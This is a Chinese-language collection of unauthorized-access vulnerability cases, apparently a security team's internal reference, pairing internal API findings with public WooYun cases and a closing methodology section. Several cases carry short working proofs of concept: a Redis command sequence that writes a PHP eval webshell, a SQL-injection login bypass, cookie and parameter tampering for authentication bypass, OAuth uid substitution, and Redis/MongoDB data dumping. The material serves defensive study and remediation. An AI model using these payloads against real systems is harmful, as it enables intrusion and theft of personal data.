# 未授权访问案例集

> 整合内部真实漏洞与业界经典案例，提供实战指导

## 一、内部真实案例

### 案例1：da-master-data 中所有接口均存在未授权问题
**系统**: 某内部系统

**漏洞描述**:
此仓库中接口均为对外服务间调用接口，但全局未做权限控制，存在未授权访问问题。敏感接口包括：新增/更新银行支行信息、根据 supplierid 查询供应商信息（含法人、电话、传真、地址）、添加/更新供应商信息等。CompanyExternalController 的权限检查因参数均可任意传入而形同虚设。

**技术细节**:
- 服务间调用接口未设置任何鉴权机制，所有接口直接对外暴露
- CompanyExternalController 通过传入用户名和 code 做权限判断，但均来自请求参数，攻击者可任意伪造
- /mdata/v1/suppliers/{supplier_id}/base 可遍历 supplier_id 枚举全量供应商敏感信息

**修复方案**:
将仓库全部接口接入 OpenAPI 网关，强制校验签名，确保请求来源于合法调用方，禁止普通员工随意调用。

**经验总结**:
内部接口路径不应暴露在外网，需通过网络隔离或白名单 IP 访问控制来限制访问；服务间调用需使用签名机制而非依赖参数传递的身份信息。

### 案例2：可获取内网用户 OA、数据集名称、URN 的未授权遍历
**系统**: 某内部系统（OpenBI 平台）

**漏洞描述**:
修复措施仅对单一接口增加鉴权，但同 Controller 下多个接口仍存在未授权访问问题。攻击者可通过 /api/v2/tabs/{id} 遍历内部全网报表获取数据集信息，通过 /api/v2/dashboards/filter/all/sheets?dashboardId={id} 遍历所有大盘数据，通过 /api/v2/areas/{id} 遍历所有区域数据。

**技术细节**:
- /api/v2/tabs/{id}：泄露内部员工信息、报表名、字段示例值，数据集 URN 格式如 ks:kwaibi/dataset:KWAIBI/146932
- /api/v2/dashboards/filter/all/sheets：通过遍历 dashboardId 可获取最全量的大盘数据
- /api/v2/areas/{id}：通过遍历 areaId 可获取所有区域数据
- 三个接口均无身份认证，且使用连续整数 ID，可自动化遍历

**修复方案**:
仅白名单内的 URL 才能通过 OpenBI 域名访问；所有遍历类接口需添加身份认证并校验当前用户权限范围。

**经验总结**:
Actuator、Swagger、Druid 等管理端点在生产环境需关闭或添加强认证；修复漏洞时需全面排查同 Controller 下的其他接口，避免遗漏。

### 案例3：封禁功能相关 4 个接口存在未授权访问
**系统**: 某内部系统（Admin 后台-运营中心）

**漏洞描述**:
Admin 后台运营中心的封禁功能 4 个相关接口存在未授权访问，攻击者无需任何身份认证信息即可直接调用接口，对任意用户执行封禁、解禁、查询操作。

**技术细节**:
- 接口路径前缀 /v3/nova/course/teacher/banned/* 下所有接口均缺少身份验证
- 封禁、解禁操作属于高危管理功能，但完全对外开放
- 攻击者可批量封禁合法用户，造成业务损失

**修复方案**:
对 /v3/nova/course/teacher/banned/* 路径下所有接口进行身份认证，限制为特定角色（管理员）才可访问。

**经验总结**:
API 网关的路由配置需仔细审查，避免通过路径变换绕过鉴权中间件；后台管理接口需独立的强认证机制，不能依赖前端隐藏来保障安全。

### 案例4：海外 KT 直播公共服务接口未鉴权可被外部攻击者绕过 Node 代理访问
**系统**: 某海外直播中台服务

**漏洞描述**:
直播仓库将中台管理接口与外部用户接口混合部署，依赖 Node 服务转发来隐藏管理接口。Node 代理服务存在可随意访问内部 Java 接口的路径穿越漏洞，导致 Java 服务端的管理接口被外部直接访问，而这些接口本身未做任何安全鉴权。

**技术细节**:
- 攻击者通过 Node 代理的路径穿越漏洞（如 ../）访问到原本不对外开放的 Java 管理接口
- Java 服务端的管理接口无鉴权，完全依赖代理层隔离
- "前端隐藏 = 安全" 的错误假设导致安全风险叠加

**修复方案**:
方案一：Java 服务端所有管理接口添加身份验证，调用者必须在白名单中；方案二：拆分中台服务和外部用户功能，物理隔离；方案三：如接口已废弃，直接删除。

**经验总结**:
后台管理接口需独立的强认证机制，不能仅依赖前端隐藏来实现安全；防御纵深原则——每一层都需要独立的安全控制。

### 案例5：配置错误导致接口未授权访问可泄露组织架构等信息
**系统**: 某内部系统

**漏洞描述**:
WebSecurityConfig.java 中安全规则配置错误，导致多个接口存在未授权访问问题，且接口返回数据较为敏感。受影响的接口包括 /hr/work/taskList（任务列表）和 /hr/work/export（数据导出），可未授权获取组织架构等敏感信息。

**技术细节**:
- Spring Security 配置错误，permitAll() 规则范围过宽，覆盖了不应开放的接口
- 导出接口（/hr/work/export）无需认证即可下载批量敏感数据
- 错误的安全配置往往影响范围广，整个路径前缀下的接口均受影响

**修复方案**:
对 OutController 中接口做好权限控制配置，仅限需要的调用方访问；精确配置 Spring Security 路由规则，禁止普通用户和无关人员访问。

**经验总结**:
微服务内部 RPC 接口如果意外暴露到外网，需立即添加认证机制；Spring Security 等安全框架的配置错误应通过自动化扫描检测，而非依赖人工审查。

### 案例6：海外 oversea-web 的 Node 转发服务允许访问内部任意 Java 服务
**系统**: 某海外 Web 服务

**漏洞描述**:
Node 转发服务的某接口允许攻击者控制内部服务路径，存在目录穿越问题。内部 Java 服务允许路径跨越，而 Node 服务允许攻击者控制转发路径，最终导致攻击者可访问内部 Java 服务中未做任何防护的接口，绕过代理隔离机制。

**技术细节**:
- Node 服务未对 path 参数做白名单校验，允许攻击者传入 ../ 形式的路径跨越字符串
- 内部 Java 服务同样允许路径跨越，形成双层目录穿越
- 两个漏洞叠加，攻击者可访问任意内部 Java 接口，完全绕过代理安全隔离

**修复方案**:
Node 服务禁止攻击者自行指定后端 Java 服务的 path；如必须动态指定，至少添加白名单校验，拒绝包含 ../ 等目录穿越字符的路径。

**经验总结**:
批量任务/定时任务的触发接口需鉴权，防止外部未授权触发；代理服务需严格限制目标路径，不信任客户端传入的路由参数。

### 案例7：259 个接口（30%）存在未授权访问，可泄露全体员工敏感信息
**系统**: 某内部 HR 相关系统

**漏洞描述**:
该仓库共 88 个 Controller，259 个接口存在未授权访问问题，分为两类：一类办公网直接访问无需身份标识，另一类限制外网访问但通过 4G 等外部网络即可访问，均无需身份认证。可未授权查询、更新全公司所有员工信息，包括：姓名、手机号、身份证号、户籍地址、教育经历、工作经历、家庭成员信息、专利信息、奖惩信息、离职/岗位调动、房补/现居住地信息等高度敏感数据。

**技术细节**:
- 系统错误依赖上游中间件（如 AP 等）做访问控制，自身无鉴权机制
- 接口数量多（259 个），说明鉴权控制从设计阶段就缺失
- 同时泄露员工身份证号、家庭成员信息等 C3/C4 级数据

**修复方案**:
分类处理：废弃接口直接下线；有用接口转移到 OpenAPI 上，使用 OpenAPI 鉴权；业务侧检查 OpenAPI 签名，保证请求来自可信来源。

**经验总结**:
Debug 接口、测试接口在生产部署时需确保已关闭或加入鉴权；鉴权应由服务自身实现，不能完全依赖上游中间件或网络层隔离。

### 案例8：/api/v1/internal/open/auditCallback/position/{id}/{result} 接口未授权可更新任意应聘状态
**系统**: 某内部招聘系统

**漏洞描述**:
该接口为 open 接口，未做任何访问控制，存在未授权访问问题。攻击者可更改任意候选人的应聘状态。同 Controller 下 /position/batch-get、/api/v1/open/data/auditCallback/offer/{id}/{result}、/api/v1/open/data/apply/list 同样存在未授权访问问题。

**技术细节**:
- open 接口类型暗示面向外部调用，但无任何签名或认证机制
- URL 路径中包含 id 和 result 参数，攻击者可遍历所有候选人 ID 并任意修改状态
- /api/v1/open/data/apply/list 可泄露候选人申请列表，存在信息泄露风险

**修复方案**:
对 open 接口做严格访问控制；若为服务间调用，使用签名机制验证调用方身份，禁止普通用户访问。

**经验总结**:
多租户系统的接口需校验租户隔离，防止跨租户访问数据；open 类命名的接口需特别关注，容易被误认为无需鉴权。

### 案例9：越权查看成交额/直播收入等数据（遍历 queryId）
**系统**: 某内部数据分析系统

**漏洞描述**:
通过遍历 queryId 可获取团购店主/分销达人直播成交额、平台达人直播收入、平台达人视频收入等未公开敏感数据。不同 queryId 对应不同查询指标。不传筛选条件时，接口返回所有直播间对应指标的全量数据。

**技术细节**:
- queryId 为可枚举的整数，无访问控制机制
- 接口在无筛选条件时返回全量敏感商业数据
- 涉及商业机密级数据（成交额、收入数据），危害高

**修复方案**:
下线接口；或对接口添加严格身份认证，校验当前用户是否有权查询对应的 queryId 指标，并限制返回范围。

**经验总结**:
静态资源目录如果包含敏感文件（如配置、备份）需添加访问控制；数据分析接口即使不在主流程中也需要鉴权，避免成为数据泄露渠道。

### 案例10：OpenController 多接口未授权可泄露候选人手机号、HC 统计数据等
**系统**: 某内部 HR 系统

**漏洞描述**:
OpenController 下所有接口均无访问控制。敏感接口包括：/api/v1/open/hr/notices/search（获取敏感通知信息）、/api/v1/open/hc/statisticsInfos（查看全量 HC 统计数据）、/api/v1/open/candidate-phone（根据 applyCode 获取任意候选人明文手机号）、/api/v1/open/checkManageLevelAuth（推断任意员工的管理职级）等。

**技术细节**:
- /api/v1/open/candidate-phone 接口通过 applyCode 直接返回明文手机号，无任何鉴权
- /api/v1/open/hc/statisticsInfos 泄露全公司 HC 编制信息，属于高敏感商业数据
- Controller 命名为 Open 但实际包含高危数据接口，命名语义与安全要求不符

**修复方案**:
对 open 接口严格限制访问，限制到特定人员、角色；若为服务间调用，与上游调用方协商签名算法，确保请求来自可信调用方。

**经验总结**:
基于路径前缀的权限判断容易被绕过，应使用精确的路由匹配规则；Controller 的命名不能成为安全决策的依据。

## 二、业界经典案例（乌云）

### 案例1：暴风影音 Redis 未授权访问可任意上传文件（Getshell）
**厂商**: 暴风影音 | **类型**: Redis未授权访问 + WebShell写入

**洞察**: Redis 服务未设置密码并对外暴露，通过 config set dir 和 dbfilename 可将 WebShell 写入 Web 目录，实现服务器完全沦陷。

**测试流程**:
1. 扫描发现目标 6379 端口开放
2. 尝试无密码连接 Redis 服务
3. 确认可执行任意 Redis 命令
4. 通过 config set dir 将工作目录设置为 Web 根目录
5. 通过 set 写入 WebShell 内容，SAVE 命令持久化写入文件

**技术细节**:
Redis 未授权访问，服务已运行 293 天（uptime_in_days:293），说明长期暴露。通过 Redis config 命令任意写文件，将 PHP Webshell 写入 Web 根目录后即可远程执行命令。

**POC示例**:
```
redis-cli -h target -p 6379
config set dir /var/www/html/
config set dbfilename shell.php
set x "\n\n<?php @eval($_POST['c']); ?>\n\n"
save
```

**绕过技巧**: 利用 Redis config 命令写任意文件，无需任何认证，直接操控文件系统。

**修复建议**: Redis 绑定内网 IP（bind 127.0.0.1），设置强密码（requirepass），禁用危险命令（rename-command CONFIG ""）；防火墙禁止 6379 端口对外开放。

### 案例2：赣企建站系统后台登录绕过（参数控制认证状态）
**厂商**: 赣企建站系统 | **类型**: 未授权访问（登录绕过）

**洞察**: 建站系统后台通过客户端可控的 lstate 参数控制登录状态，修改该参数即可绕过身份验证直接进入后台，属于典型的"信任客户端状态"设计缺陷。

**测试流程**:
1. 访问后台登录页面
2. 抓取登录请求包，分析 Cookie/URL 参数
3. 发现 lstate 等状态控制参数
4. 修改 lstate 值为 1 绕过验证
5. 直接访问后台功能页面

**技术细节**:
lstate 参数控制服务端的登录验证逻辑，通过 URL 参数或 Cookie 传递即可修改，服务端未做任何服务端 Session 校验，完全依赖客户端传递的状态值。

**POC示例**:
```
GET /admin/index.php?lstate=1 HTTP/1.1
# 或在 Cookie 中添加:
Cookie: lstate=1
```

**绕过技巧**: 修改 URL 参数或 Cookie 中的认证状态标志，绕过前端/服务端认证逻辑检查。

**修复建议**: 服务端严格基于 Session 验证用户登录状态，绝不信任客户端传递的认证状态参数。

### 案例3：中国信鸽网后台未授权访问（URL 直接可达）
**厂商**: 中国信鸽网 | **类型**: 未授权访问（后台直接访问）

**洞察**: 后台管理页面仅依赖 URL 的隐蔽性而非实际认证机制，攻击者通过猜测常见后台路径即可直接访问，无需任何凭证。

**测试流程**:
1. 猜测常见后台路径（/admin/、/manage/ 等）
2. 直接访问后台 URL
3. 确认无任何认证即可进入
4. 操作后台管理功能

**技术细节**:
后台 URL 完全可直接访问，无任何 Session 或 Token 验证机制，属于最基础的未授权访问漏洞形式。/admin/index.asp 和 /manage/index.asp 均可直接访问。

**POC示例**:
```
GET /admin/index.asp HTTP/1.1
GET /manage/index.asp HTTP/1.1
```

**绕过技巧**: 无需绕过，纯路径访问即可。

**修复建议**: 所有后台页面添加 Session 验证；部署 IP 白名单限制，仅允许内网或 VPN 访问后台路径。

### 案例4：某服务 Redis 未授权访问——敏感数据泄露与 Getshell
**厂商**: 某服务（驼峰摘要） | **类型**: Redis未授权访问（敏感信息泄露）

**洞察**: Redis 未授权访问不仅可以直接读取内存中的 Session、用户数据等敏感信息，若能猜到 Web 目录路径还可写入 WebShell，形成"信息泄露 → 提权"的攻击链。

**测试流程**:
1. 扫描发现目标 6379 端口开放，尝试无密码连接
2. 使用 KEYS * 遍历所有键名
3. GET / HGETALL 命令读取 Session 和用户数据
4. 如果知道 Web 路径，进一步写入 WebShell

**技术细节**:
Redis 内存中存储大量敏感数据，包括用户 Session、用户个人信息等。如果攻击者能猜到 Web 目录路径（/var/www/html/ 等），可配合 config set 写入 WebShell。

**POC示例**:
```
redis-cli -h target
KEYS *
GET session:abc123
HGETALL user:1001
```

**绕过技巧**: 无需绕过，默认无认证直接访问。

**修复建议**: Redis 绑定 127.0.0.1，防火墙限制 6379 端口，强制设置 requirepass 密码认证。

### 案例5：某游戏平台 MongoDB 未授权访问泄露千万条用户数据
**厂商**: 某游戏平台 | **类型**: MongoDB未授权访问

**洞察**: MongoDB 默认配置无需认证，直接暴露在公网，攻击者可读取全部数据库内容，导致千万条含用户名、GPS 定位、地理位置等数据的记录泄露。

**测试流程**:
1. 发现目标 27017 端口开放
2. 使用 MongoDB 客户端直接连接（无密码）
3. 使用 show dbs 枚举所有数据库
4. 遍历集合并导出用户数据

**技术细节**:
MongoDB 公网暴露，默认无认证。数据库中包含千万条用户记录，含用户名、GPS 定位、地理位置等敏感信息，可被完整导出。

**POC示例**:
```
mongo target:27017
show dbs
use userdb
db.users.find().limit(10)
```

**绕过技巧**: MongoDB 默认无认证配置，直接访问无需任何绕过。

**修复建议**: MongoDB 配置 auth=true 强制认证，绑定内网地址，防火墙限制 27017 端口对外暴露。

### 案例6：花椒直播任意用户登录（认证参数可篡改）
**厂商**: 花椒直播 | **类型**: 未授权访问（认证绕过）

**洞察**: 直播平台身份认证存在设计缺陷，服务端未校验 uid 与 token 的对应绑定关系，通过修改 uid 参数可登录任意用户账号，包括明星账号。

**测试流程**:
1. 正常登录自己的账号，抓取认证请求
2. 分析认证 token/uid 的生成逻辑
3. 修改请求中的 uid 为目标用户 ID
4. 服务端未校验 uid 与 token 的绑定关系，登录成功

**技术细节**:
认证逻辑存在根本性缺陷：服务端接受客户端传入的 uid，仅验证 token 有效性，但不验证 uid 与该 token 的归属关系，导致可持有任意有效 token 的情况下以任意 uid 登录。

**POC示例**:
```
# 修改 Cookie 或 POST 参数中的 uid 为目标用户 ID
POST /login HTTP/1.1
Cookie: token=my_valid_token; uid=target_user_id
```

**绕过技巧**: 服务端未校验 uid 与 token 的对应关系，直接替换 uid 参数即可。

**修复建议**: 服务端验证 uid 与签名 token 的强绑定关系，token 需包含用户 ID 并做 HMAC 签名，不允许客户端独立传入 uid 参数。

### 案例7：锐捷 RSR 路由器未授权访问及免密码登录（Base64 空凭证绕过）
**厂商**: 锐捷网络RSR路由器 | **类型**: 未授权访问（网络设备默认配置）

**洞察**: 网络设备默认配置允许匿名访问，Cookie 中的 auth 参数使用 Base64 编码的空凭证（guest:），可直接绕过认证进入路由器管理界面，控制整个网络设备。

**测试流程**:
1. 访问路由器 Web 管理界面
2. 分析 Cookie 中的认证参数
3. 发现 auth 参数为 Base64 编码的 "guest:"
4. 构造包含该 auth 的请求直接登录
5. 查看并修改路由配置

**技术细节**:
Cookie 中的 auth=Z3Vlc3Q6 解码为 "guest:"（空密码的 guest 账号），路由器直接接受此凭证，允许查看和修改所有路由器配置。

**POC示例**:
```
GET /admin/login HTTP/1.1
Cookie: currentURL=2.4; auth=Z3Vlc3Q6
# auth=Z3Vlc3Q6 => Base64解码 => guest:
```

**绕过技巧**: Base64 编码的空凭证 auth=Z3Vlc3Q6 绕过认证，利用默认 guest 账号无密码特性。

**修复建议**: 强制修改默认密码，禁用 guest 账号，升级设备固件，网络层限制管理界面只允许内网访问。

### 案例8：某市锅炉节能安全环保监控系统登录绕过（万能密码）
**厂商**: 工控系统 | **类型**: 未授权访问（ASP经典认证绕过）

**洞察**: 工控系统的 ASP 登录页面使用字符串拼接构造 SQL 查询，登录验证逻辑存在经典 SQL 注入，通过万能密码可绕过认证直接进入系统，危及工业控制安全。

**测试流程**:
1. 发现目标使用 ASP 登录页（Login.asp）
2. 在用户名和密码字段同时输入万能密码
3. 服务端 SQL 逻辑被破坏，条件恒为真
4. 成功登录系统，访问锅炉监控功能

**技术细节**:
Login.asp 使用字符串拼接构造 SQL：SELECT * FROM users WHERE username='...' AND password='...'，注入万能密码后条件恒为真，认证被完全绕过。

**POC示例**:
```
Username: ' or '1'='1
Password: ' or '1'='1
# SQL 变为: WHERE username='' or '1'='1' AND password='' or '1'='1'
```

**绕过技巧**: 经典 SQL 注入万能密码，同时在用户名和密码字段注入，确保 AND 条件两侧均为真。

**修复建议**: 使用参数化查询替代字符串拼接；对登录接口做失败次数限制和 IP 封锁，防止暴力破解。

### 案例9：V5SHOP 网店系统后台认证绕过（Ajax 参数绕过）
**厂商**: V5SHOP | **类型**: 未授权访问（Ajax接口认证绕过）

**洞察**: 网店系统对 Ajax 请求的认证处理逻辑存在缺陷，通过在普通请求中添加 ajax=1 参数，服务端认为是内部 Ajax 调用而跳过认证，直接访问后台管理功能。

**测试流程**:
1. 发现后台 URL 存在 Ajax 接口路径
2. 分析 ajax 参数对认证流程的影响
3. 在普通 GET 请求中添加 ajax=1 参数
4. 绕过认证，直接访问后台管理功能

**技术细节**:
V5SHOP 版本 < 9.0，后台认证逻辑对 Ajax 请求做了特殊处理（认为来自内部），但通过 URL 参数 ajax=1 即可触发该逻辑，无需经过正常登录流程。

**POC示例**:
```
GET /admin/index.php?ajax=1 HTTP/1.1
```

**绕过技巧**: Ajax 标识参数绕过认证检查，利用服务端对"内部 Ajax 请求"的信任假设。

**修复建议**: 统一认证逻辑，Ajax 请求与普通请求使用相同的 Session 验证，不区分请求类型做差异化认证处理。

### 案例10：某互联网公司账号任意登录（OAuth uid 与 Token 未绑定）
**厂商**: 某互联网公司新闻客户端 | **类型**: 未授权访问（第三方OAuth绑定绕过）

**洞察**: 第三方 OAuth 登录流程中，服务端仅验证 token 有效性而不验证 uid 与 token 的归属关系，攻击者可使用自己的有效 token 配合任意 uid，登录任意用户账号，包括官方账号。

**测试流程**:
1. 使用第三方登录获取自己账号的有效 token
2. 修改请求中的 uid 为目标用户的 uid
3. 发送携带他人 uid 和自己 token 的登录请求
4. 服务端校验 token 有效但不验证归属，成功登录目标账号

**技术细节**:
OAuth 流程中，服务端接受客户端传入的 uid 参数，仅验证 token 是否有效，未从 OAuth 服务端重新获取 uid 进行校验，导致 uid 可被任意替换。

**POC示例**:
```
POST /oauth/login HTTP/1.1

uid=target_user_id&token=my_own_valid_token&platform=weibo
```

**绕过技巧**: 替换 uid 参数，使用自己有效 token + 他人 uid 组合，利用服务端仅验证 token 有效性而不验证归属的漏洞。

**修复建议**: OAuth 登录必须从 OAuth 服务端验证 uid 而非信任客户端传递的 uid 参数；token 中应包含 uid 信息并做签名验证，防止伪造。

## 三、方法论总结

### 3.1 高频参数统计

| 参数名 | 出现频次 | 风险说明 |
|--------|----------|----------|
| uid / userId | ★★★★★ | 用户标识，篡改可实现身份冒用 |
| token / auth | ★★★★★ | 认证凭证，泄露或伪造可绕过认证 |
| supplierId / companyId | ★★★★ | 业务实体 ID，可遍历访问他人数据 |
| queryId / dashboardId | ★★★★ | 数据查询标识，可枚举获取敏感指标 |
| lstate / ajax | ★★★ | 状态控制参数，可篡改绕过认证逻辑 |
| dataSourceId / applyCode | ★★★ | 资源标识，未鉴权时可遍历访问 |

### 3.2 攻击模式分布

| 攻击模式 | 案例数 | 典型场景 |
|----------|--------|----------|
| 接口完全无鉴权 | 8 | Open Controller、服务间 RPC 接口、管理端点对外暴露 |
| 认证逻辑绕过 | 4 | 参数控制状态（lstate）、Ajax 请求特权、OAuth uid 可替换 |
| 中间件/代理绕过 | 3 | Node 代理路径穿越、依赖上游中间件鉴权失效 |
| 基础设施未授权 | 3 | Redis/MongoDB 无密码对外暴露、网络设备默认凭证 |
| 可遍历枚举 | 2 | queryId/dashboardId 连续整数、supplierid 可枚举 |

### 3.3 关键检测信号

**高危信号（立即告警）**:
- Controller 命名含 Open/Public/Internal 但无鉴权注解
- 接口路径含 `/open/`、`/internal/`、`/api/v1/open/` 且无鉴权
- Redis/MongoDB 服务端口（6379/27017）对公网开放
- Cookie/URL 参数中存在 auth、lstate、state 等状态控制字段
- OAuth 登录流程中接受客户端传入的 uid 参数

**中危信号（人工审核）**:
- Spring Security 配置中大量使用 permitAll()
- 接口文档中标注"服务间调用"但对外可达
- 查询接口使用连续整数 ID 且无访问控制
- Node/Nginx 代理允许客户端控制后端路由路径
- 管理功能（封禁、审批、数据导出）接口无角色权限检查

**低危信号（周期巡检）**:
- 废弃接口未下线
- 测试/Debug 接口在生产环境存活
- 安全配置依赖上游 AP/CDN/网关而自身无鉴权

### 3.4 常见绕过技巧

1. **参数状态篡改**: 修改 lstate、ajax、auth 等客户端可控状态参数，触发服务端特殊处理路径绕过认证。

2. **uid 与 token 解绑**: 持有有效 token 的同时替换 uid，利用服务端仅验证 token 合法性而不验证 uid 归属的缺陷。

3. **路径穿越绕过代理**: 在 URL 路径中使用 `../` 绕过 Node/Nginx 代理的路由白名单限制，访问原本被隔离的内部接口。

4. **Base64 编码空凭证**: 利用设备/系统默认的 guest 账号，通过 Base64 编码（如 `Z3Vlc3Q6` = `guest:`）直接绕过认证。

5. **SQL 万能密码**: 在登录表单中注入 `' or '1'='1` 破坏 SQL 认证逻辑，适用于存在字符串拼接 SQL 的老旧系统。

6. **连续 ID 枚举**: 利用 queryId、dashboardId、supplierId 等连续整数 ID，无需猜测即可系统性遍历访问所有资源。

7. **OAuth 流程 uid 替换**: 在第三方登录回调中替换 uid 参数，结合自己的有效 token 登录任意用户账号。
